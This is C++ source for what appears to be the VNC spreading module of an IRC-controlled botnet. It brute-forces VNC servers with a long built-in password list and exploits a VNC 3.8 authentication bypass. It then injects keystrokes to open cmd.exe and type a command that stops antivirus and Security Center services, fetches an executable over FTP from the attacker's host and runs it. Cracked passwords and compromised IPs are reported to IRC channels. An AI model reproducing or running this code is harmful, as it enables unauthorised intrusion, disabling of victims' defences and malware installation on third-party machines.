#include "include.h"

#ifndef NO_VNC

#include "rfb.h"
extern "C" {
	#include "d3des.h"
}

//max size 8 characters
char *passwordlist[] = {
"host4free"
"123",
"1234",
"12345",
"123456",
"1234567",
"12345678",
"87654321",
"7654321",
"654321",
"4321",
"321",
"21",
"abc",
"abcd",
"abcde",
"abcdef",
"abcdefgh",
"1st",
"210",
"234",
"2345",
"23456",
"234567",
"2345678",
"23456789",
"2nd",
"321",
"3210",
"345",
"3456",
"34567",
"345678",
"3456789",
"34567890",
"3rd",
"432",
"4321",
"43210",
"456",
"4567",
"45678",
"456789",
"4567890",
"4th",
"543",
"5432",
"54321",
"543210",
"567",
"5678",
"56789",
"567890",
"5th",
"654",
"6543",
"65432",
"654321",
"6543210",
"678",
"6789",
"67890",
"6th",
"765",
"7654",
"76543",
"765432",
"7654321",
"76543210",
"1",
"2",
"3",
"4",
"5",
"6",
"7",
"8",
"a",
"b",
"c",
"d",
"e",
"qwerty",
"monkey",
"help",
"pimp",
"sexy",
"sex",
"testing",
"test",
"changeme",
"change",
"computer",
"comp",
"cam",
"vnc",
"root",
"admin",
"password",
"leet",
"1337",
"bitch",
"fuck",
"shit",
"whore",
"crack",
"cracker",
"weed",
"coke",
"god",
"jesus",
"pimp",
"pimpin",
"ryan",
"bob",
"bobnob",
"tom",
"helpme",
"~!@#$%^&",
"!@#$%^&*",
"bass",
"kkk",
"kool",
"cool",
"money",
"paper",
"register",
"owner",
"master",
"duck",
"dell",
"ftp",
"server",
"admin",
"high",
"pass",
"porn",
"boobs",
"love",
"admin", 
"Admin", 
"password", 
"Password", 
"1", 
"12", 
"123", 
"1234", 
"beer", 
"!@#$", 
"asdfgh", 
"!@#$%", 
"!@#$%^", 
"!@#$%^&", 
"!@#$%^&*", 
"windoze", 
"hax", 
"dude", 
"owned", 
"lol", 
"rooted", 
"noob", 
"TEMP", 
"share", 
"r00t", 
"freak", 
"ROOT", 
"TEST", 
"SYSTEM", 
"LOCAL", 
"SERVER", 
"ACCESS", 
"BACKUP", 
"computer", 
"fucked", 
"gay", 
"idiot", 
"Internet", 
"test", 
"2003", 
"2004", 
"backdoor", 
"whore", 
"wh0re", 
"CNN", 
"pwned", 
"own", 
"crash", 
"passwd", 
"PASSWD", 
"iraq", 
"devil", 
"linux", 
"UNIX", 
"feds", 
"fish", 
"changeme", 
"ASP", 
"PHP", 
"666",
"BOX", 
"Box", 
"box", 
"12345", 
"123456", 
"1234567", 
"12345678", 
"654321", 
"54321", 
"111", 
"000000", 
"0000000", 
"1111111", 
"88888888", 
"fanny",
"pass", 
"passwd", 
"database", 
"abcd", 
"oracle", 
"sybase", 
"123qwe", 
"fool", 
"server", 
"computer", 
"Internet", 
"super", 
"123asd", 
"West", 
"enable", 
"xp", 
"23", 
"2002", 
"2600", 
"0", 
"110", 
"2525", 
"newfy", 
"111111", 
"121212", 
"123123", 
"1234qwer", 
"123abc", 
"007", 
"alpha", 
"1776", 
"newfie", 
"patrick", 
"pat", 
"root", 
"sex", 
"god", 
"foobar", 
"1778", 
"a", 
"aaa", 
"abc", 
"test", 
"temp", 
"win", 
"pc", 
"asdf", 
"secret", 
"drugs", 
"qwer", 
"yxcv", 
"zxcv", 
"home", 
"xxx", 
"owner", 
"login", 
"Login", 
"west", 
 "Ospite", 
"Default", 
"admins", 
"teacher", 
"student", 
"superman", 
"wmd", 
"kids", 
"penis", 
"wwwadmin", 
"database", 
"changeme", 
"dope", 
"test123", 
"user", 
"private", 
"69", 
"root", 
"654321", 
"xxyyzz", 
"asdfghjk", 
"mybaby", 
"vagina", 
"pussy", 
"leet", 
"metal", 
"work", 
"school", 
"mybox", 
"box", 
"werty", 
"baby", 
"porn", 
"homework", 
"secrets", 
"x", 
"z", 
"bong",
"qwertyui", 
"secret", 
"abc123", 
"password", 
"red123", 
"qwerty", 
"admin123", 
"zxcvbnm", 
"poiuytre", 
"pwd", 
"pass", 
"love", 
"mypc", 
"texas", 
"Texas", 
"whisky", 
"whiskey", 
"azerty", 
"poiut", 
"mouse", 
"souris", 
"cederom", 
"cédérom", 
"bière", 
"biere", 
"athlon", 
"oil", 
"opteron", 
"écran", 
"ecran", 
"reseau", 
"carte", 
"merde", 
"mince", 
"ami", 
"amie", 
"copin", 
"copine", 
"42", 
"harry", 
"hagrid", 
"potter", 
"hermine", 
"azkaban", 
"askaban", 
"cauldron", 
"buckbeak", 
"hogwarts", 
"dementor", 
"madre", 
"switch", 
"mypass", 
"pw",
"web",
"www",
"internet",
"accounts",
"home",
"homeuser",
"user",
"oem",
"oemuser",
"windows",
"win98",
"win2k",
"winxp",
"winnt",
"win2000",
"qaz",
"asd",
"zxc",
"qwe",
"bob",
"jen",
"joe",
"fred",
"bill",
"mike",
"john",
"peter",
"luke",
"sam",
"sue",
"susan",
"peter",
"brian",
"lee",
"neil",
"ian",
"chris",
"eric",
"george",
"kate",
"bob",
"katie",
"mary",
"login",
"technical",
"backup",
"exchange",
"fuck",
"bitch",
"slut",
"sex",
"god",
"hell",
"hello",
"domain",
"database",
"access",
"dbpass",
"data",
"db1",
"db2",
"db1234",
"sa",
"sql",
"sqlpass"
"oracle",
"ibm",
"cisco",
"dell",
"compaq",
"siemens",
"hp",
"nokia",
"xp",
"control",
"office",
"blank",
"winpass",
"main",
"lan",
"internet",
"intranet",
"student",
"teacher",
"staff"
};

#define MAXPWLEN 8
#define CHALLENGESIZE 16
#define sizeofpasslist (sizeof(passwordlist) / sizeof(LPTSTR))

int ext_num;
int usedlist[sizeofpasslist];

unsigned char fixedkey[8] = {23,82,107,6,35,78,88,7};

void vncEncryptBytes(unsigned char *bytes, char *passwd)
{
    unsigned char key[8];
    unsigned int i;

    /* key is simply password padded with nulls */

    for (i = 0; i < 8; i++) {
		if (i < strlen(passwd)) {
		    key[i] = passwd[i];
		} else {
		    key[i] = 0;
		}
    }

    deskey(key, EN0);

    for (i = 0; i < CHALLENGESIZE; i += 8) {
		des(bytes+i, bytes+i);
    }
}

void vncEncryptPasswd(unsigned char *encryptedPasswd, char *passwd )
{
	unsigned int i;

    /* pad password with nulls */
    for (i = 0; i < MAXPWLEN; i++) {
		if (i < strlen(passwd)) {
			encryptedPasswd[i] = passwd[i];
		} else {	
			encryptedPasswd[i] = 0;
		}
    }

    /* Do encryption in-place - this way we overwrite our copy of the plaintext
       password */
    deskey(fixedkey, EN0);
    des(encryptedPasswd, encryptedPasswd);
}

BOOL ReadExact(SOCKET r_sock, char *inbuf, int wanted) {

	int offset = 0;
	
	while (wanted > 0) {
		int bytes = recv(r_sock, inbuf+offset, wanted, 0);
		if ((bytes == 0) || (bytes == SOCKET_ERROR)) return FALSE;
		wanted -= bytes;
		offset += bytes;
	}

	return TRUE;
}

BOOL WriteExact(SOCKET w_sock, char *buf, int bytes) {

	if (bytes == 0) return FALSE;

	int i = 0;
    int j;

    while (i < bytes) {
		j = send(w_sock, buf+i, bytes-i, 0);
		if (j == SOCKET_ERROR || j==0) return FALSE;
		i += j;
    }

	return TRUE;
}

inline void ReadString(SOCKET s_sock, char *buf, int length)
{
	if (length > 0)
		ReadExact(s_sock, buf, length);
	buf[length] = '\0';
}


/*
	Universal VNC Rooter by D
*/

// state: 1 - enable key (press)
//		  0 - disable key (release)
// if state == 2: first enable key, then disable
void SendKey(SOCKET sock, char bkey, char key, int state)
{
	char sendkey[8];

	// compose packet
	memset(sendkey, '\x04', 1);

	if (state == 0 || state == 1)
		memset(sendkey + 1, state, 1);
	else
		memset(sendkey + 1, 1, 1);

	memset(sendkey + 2, 0, 4);
	memset(sendkey + 6, bkey, 1);
	memset(sendkey + 7, key, 1);

	send(sock, sendkey, sizeof(sendkey), 0);

	if (state > 1)
	{
		memset(sendkey + 1, 0, 1);
		send(sock, sendkey, sizeof(sendkey), 0);
	}
}

void VNCRoot(SOCKET sVNC, char *ftp)
{
	char text_cmd[] = "%systemroot%\\system32\\cmd.exe";
	char bkey = '\xff',
		 keyctrl = '\xe3',
		 keyalt = '\xe9',
		 keydel = '\x9f',
		 keydown = '\x54',
		 keyenter = '\x0d';
	unsigned int i;

	Sleep(2000);

	//Press ENTER (in case of screensaver)
	SendKey(sVNC, bkey, keyenter, 2);
	Sleep(500);

	//Press ctrl+alt+del
	SendKey(sVNC, bkey, keyctrl, 1);
	SendKey(sVNC, bkey, keyalt, 1);
	SendKey(sVNC, bkey, keydel, 1);
	Sleep(100);
	SendKey(sVNC, bkey, keydel, 0);
	SendKey(sVNC, bkey, keyalt, 0);
	SendKey(sVNC, bkey, keyctrl, 0);

	Sleep(2000);

	//If its Windows2k
	for (i = 0; i < 4; i++) 
	{
		SendKey(sVNC, bkey, keydown, 2);
		Sleep(500);
	}

	//Press ENTER
	SendKey(sVNC, bkey, keyenter, 2);
	Sleep(2000);

	//Now the taskmanager is opened on winxp and win2k

	//Press and release alt key
	SendKey(sVNC, bkey, keyalt, 2);
	Sleep(500);
	
	//Press down arrow key
	SendKey(sVNC, bkey, keydown, 2);
	Sleep(500);

	//Press ENTER
	SendKey(sVNC, bkey, keyenter, 2);
	Sleep(2000);

	//Run window is opened

	//type in "cmd"
	for (i = 0; i < strlen(text_cmd); i++) 
	{
		SendKey(sVNC, 0, text_cmd[i], 2);
		Sleep(125);
	}

	//press ENTER
	SendKey(sVNC, bkey, keyenter, 2);
	Sleep(2000);

	//send ftp line
	for (i = 0; i < strlen(ftp); i++) 
	{
		SendKey(sVNC, 0, ftp[i], 2);
		Sleep(125);
	}
   
	//press ENTER
	Sleep(1000);
	SendKey(sVNC, bkey, keyenter, 2);
	Sleep(30000);
	
	SendKey(sVNC, bkey, keyenter, 2);
}


BOOL VNCPassCheck(SOCKET Sock, char IP[16], BOOL UseCFTP, BOOL Root) {

	char Buffer[MAX_LINE_SIZE];
	char SendBuf[MAX_LINE_SIZE];
    Root = TRUE;
	int CFretry = 0;
	BOOL ABcheck = TRUE;
	char FTPLine[256];
	int checked = 0;
	int r;

	srand(GetTickCount());
	r = rand()%sizeofpasslist;
//strcat(CFTPHoldr, CFTPPath);
//strcat(CFTPHoldr, CFTPFile);
	if (UseCFTP) 
//strcat(CFTPHoldr, CFTPPath);
//strcat(CFTPHoldr, CFTPFile);
		_snprintf(FTPLine, sizeof(FTPLine), 
		"cmd /c net stop \"AntiVir PersonalEdition Classic Guard\" &net stop \"Security Center\" &net stop \"Symantec AntiVirus\" &net stop \"Norton AntiVirus Server\" &net stop navapsvc &net stop kavsvc &net stop McAfeeFramework &net stop NOD32krn &net stop McShield &echo open %s %d >> ik &echo user %s %s >> ik &echo binary >> ik &echo get %s >> ik &echo bye >> ik &ftp -n -v -s:ik &del ik &%s &exit",	
			CFTPHost, CFTPPort, CFTPUser, CFTPPass, CFTPPath, CFTPFile);
	else {
		char Fname[MAX_PATH];
		_snprintf(Fname, sizeof(Fname), "%s.exe", GenerateNumberNick(1));
		_snprintf(FTPLine, sizeof(FTPLine), 
		"cmd /c net stop \"AntiVir PersonalEdition Classic Guard\" &net stop \"Security Center\" &net stop \"Symantec AntiVirus\" &net stop \"Norton AntiVirus Server\" &net stop navapsvc &net stop kavsvc &net stop McAfeeFramework &net stop NOD32krn &net stop McShield &echo open %s %d >> ik &echo user %s %s >> ik &echo get %s >> ik &echo bye >> ik &ftp -n -v -s:ik &del ik &%s &exit",
			GetIP(Sock), FTPPort, FTPUser, FTPPass, Fname, Fname);
	}
	

	while (1) {

		struct sockaddr_in thataddr;
		int res;
		SOCKET m_sock;

		m_sock = socket(PF_INET, SOCK_STREAM, 0);
		if (m_sock == INVALID_SOCKET) {
			closesocket(m_sock);
			return FALSE;
		}
		
		thataddr.sin_addr.s_addr = inet_addr(IP);
		thataddr.sin_family = AF_INET;
		thataddr.sin_port = htons(5900);	

		res = connect(m_sock, (LPSOCKADDR) &thataddr, sizeof(thataddr));
		if (res == SOCKET_ERROR) {
			closesocket(m_sock);		
			return FALSE;
		}

		//connected
		//now lets negotiate protocol
		rfbProtocolVersionMsg pv;

		if (!ReadExact(m_sock, pv, sz_rfbProtocolVersionMsg)) {
			closesocket(m_sock);
			return FALSE;
		}

		pv[sz_rfbProtocolVersionMsg] = 0;

		int m_majorVersion, m_minorVersion;

		if (sscanf(pv,rfbProtocolVersionFormat,&m_majorVersion,&m_minorVersion) != 2) {
			closesocket(m_sock);
			return FALSE;
		}

		if ((m_majorVersion == 3) && (m_minorVersion < 3)) {
			// if server is 3.2 we can't use the new authentication //
			closesocket(m_sock);
			return FALSE;
		}

		if ((m_majorVersion == 3) && (m_minorVersion == 8) && ABcheck) {
			sprintf(pv, rfbProtocolVersionFormat, rfbProtocolMajorVersion, rfbProtocolMinorVersionFake);
		} else {
			sprintf(pv, rfbProtocolVersionFormat, rfbProtocolMajorVersion, rfbProtocolMinorVersion);
			ABcheck = FALSE;
		}

		if (!WriteExact(m_sock, pv, sz_rfbProtocolVersionMsg)) {
			closesocket(m_sock);
			return FALSE;
		}

		//auth part
		CARD32 authScheme, authResult;
		CARD8 challenge[CHALLENGESIZE];

		if (ABcheck) {
			ABcheck = FALSE;
			char szClientPacket[] = "\x01";
			//we expect to get 2 bytes 
			if (!ReadExact(m_sock, (char *)&authScheme, 2)) {
				closesocket(m_sock);
				return FALSE;
			}
			//return clientpacket
			if (!WriteExact(m_sock, szClientPacket, 1)) {
				closesocket(m_sock);
				return FALSE;
			}
			if (ReadExact(m_sock, (char *) &authResult, 4)) {
			
				authResult = Swap32IfLE(authResult);
			
				switch (authResult) {
				case rfbVncAuthOK: 
					{		
						rfbServerInitMsg m_si;
						//send non-shared session request and receive data
						if (WriteExact(m_sock, (char *) useShared, sz_rfbClientInitMsg) && 
							ReadExact(m_sock, (char *) &m_si, sz_rfbServerInitMsg)) {							
							//lets get desktop name
							m_si.framebufferWidth = Swap16IfLE(m_si.framebufferWidth);
							m_si.framebufferHeight = Swap16IfLE(m_si.framebufferHeight);
							m_si.format.redMax = Swap16IfLE(m_si.format.redMax);
							m_si.format.greenMax = Swap16IfLE(m_si.format.greenMax);
							m_si.format.blueMax = Swap16IfLE(m_si.format.blueMax);
							m_si.nameLength = Swap32IfLE(m_si.nameLength);

							TCHAR *m_desktopName;
							m_desktopName = new TCHAR[m_si.nameLength + 2];

							ReadString(m_sock, m_desktopName, m_si.nameLength);

							_snprintf(SendBuf, sizeof(SendBuf), "VNC%d.%d %s: %s - [AuthBypass]", 
								m_majorVersion, m_minorVersion, m_desktopName, IP);
							IrcPrivmsg(Sock, VNCChan, SendBuf);
							memset(SendBuf, 0, sizeof(SendBuf));

							if (Root)
								_snprintf(Buffer, sizeof(Buffer), "Attempting transfer to: %s.", IP);
			IrcPrivmsg(Sock, TransferChannel, Buffer);
								VNCRoot(m_sock, FTPLine);
						}

						closesocket(m_sock);
						return TRUE;
					}
				default:
					{
						closesocket(m_sock);
						break;
					}	
				}
			} else {				
				closesocket(m_sock);
			}
			Sleep(5000);

		} else {
			if (!ReadExact(m_sock, (char *)&authScheme, 4)) {
				closesocket(m_sock);
				return FALSE;
			}

			authScheme = Swap32IfLE(authScheme);
	
			switch (authScheme) {
		
			case rfbConnFailed:
				{
					//lets try again
					closesocket(m_sock);
					CFretry++;
					if (CFretry == 2) { //not worth trying anymore
						return FALSE;
					}
					Sleep(2000);
					break;
				}
		
			case rfbNoAuth:
				{
					rfbServerInitMsg m_si;
					//send non-shared session request and receive data
					if (WriteExact(m_sock, (char *) useShared, sz_rfbClientInitMsg) && 
						ReadExact(m_sock, (char *) &m_si, sz_rfbServerInitMsg)) {							
						//lets get desktop name
						m_si.framebufferWidth = Swap16IfLE(m_si.framebufferWidth);
						m_si.framebufferHeight = Swap16IfLE(m_si.framebufferHeight);
						m_si.format.redMax = Swap16IfLE(m_si.format.redMax);
						m_si.format.greenMax = Swap16IfLE(m_si.format.greenMax);
						m_si.format.blueMax = Swap16IfLE(m_si.format.blueMax);
						m_si.nameLength = Swap32IfLE(m_si.nameLength);

						TCHAR *m_desktopName;
						m_desktopName = new TCHAR[m_si.nameLength + 2];

						ReadString(m_sock, m_desktopName, m_si.nameLength);

						_snprintf(SendBuf, sizeof(SendBuf), "VNC%d.%d %s: %s - [NoPassword]", 
							m_majorVersion, m_minorVersion, m_desktopName, IP);
						IrcPrivmsg(Sock, VNCChan, SendBuf);
						memset(SendBuf, 0, sizeof(SendBuf));

						if (Root)
											_snprintf(Buffer, sizeof(Buffer), "Attempting transfer to: %s.", IP);
			IrcPrivmsg(Sock, TransferChannel, Buffer);
							VNCRoot(m_sock, FTPLine);
					}

					closesocket(m_sock);
					return TRUE;
				}
		
			case rfbVncAuth:
				{
					if (!ReadExact(m_sock, (char *)challenge, CHALLENGESIZE)) {
						closesocket(m_sock);
						return FALSE;
					}

					char passwd[256];	
					unsigned char m_encPasswd[8];

					r++;
					if (r == sizeofpasslist)
						r = 0;
					strncpy(passwd, passwordlist[r], sizeof(passwd)-1);

					passwd[strlen(passwd)] = '\0';

					vncEncryptPasswd(m_encPasswd, passwd);				
	
					vncEncryptBytes(challenge, passwd);
			
					if (!WriteExact(m_sock, (char *) challenge, CHALLENGESIZE)) {
						closesocket(m_sock);
						return FALSE;
					}

					if (!ReadExact(m_sock, (char *) &authResult, 4)) {
						closesocket(m_sock);
						return FALSE;
					}
			
					authResult = Swap32IfLE(authResult);
			
					switch (authResult) {
					case rfbVncAuthOK: 
						{		
							rfbServerInitMsg m_si;
							//send non-shared session request and receive data
							if (WriteExact(m_sock, (char *) useShared, sz_rfbClientInitMsg) && 
								ReadExact(m_sock, (char *) &m_si, sz_rfbServerInitMsg)) {							
								//lets get desktop name
								m_si.framebufferWidth = Swap16IfLE(m_si.framebufferWidth);
								m_si.framebufferHeight = Swap16IfLE(m_si.framebufferHeight);
								m_si.format.redMax = Swap16IfLE(m_si.format.redMax);
								m_si.format.greenMax = Swap16IfLE(m_si.format.greenMax);
								m_si.format.blueMax = Swap16IfLE(m_si.format.blueMax);
								m_si.nameLength = Swap32IfLE(m_si.nameLength);

								TCHAR *m_desktopName;
								m_desktopName = new TCHAR[m_si.nameLength + 2];

								ReadString(m_sock, m_desktopName, m_si.nameLength);

								_snprintf(SendBuf, sizeof(SendBuf), "VNC%d.%d %s: %s - %s", 
									m_majorVersion, m_minorVersion, m_desktopName, IP, passwd);
								IrcPrivmsg(Sock, VNCChan, SendBuf);
								memset(SendBuf, 0, sizeof(SendBuf));

								if (Root)
			_snprintf(Buffer, sizeof(Buffer), "Attempting transfer to: %s.", IP);
			IrcPrivmsg(Sock, TransferChannel, Buffer);
									VNCRoot(m_sock, FTPLine);

							}

							closesocket(m_sock);
							return TRUE;
						}
					case rfbVncAuthFailed: 
						{
							CFretry = 0;
							closesocket(m_sock);
							checked++;
							if (checked == sizeofpasslist)
								return FALSE;
							Sleep(5000); //lets wait and try another pass
							break;
						}
					default:
						{
							closesocket(m_sock);
							return FALSE;
						}
					}
					break;
				}
		
			default:
				{
				closesocket(m_sock);
				return FALSE;
				}
			}
		}
		if (m_sock != INVALID_SOCKET) {
			shutdown(m_sock, SD_BOTH);
			closesocket(m_sock);
			m_sock = INVALID_SOCKET;
		}
		Sleep(100);
	}
	return FALSE;
}

#endif

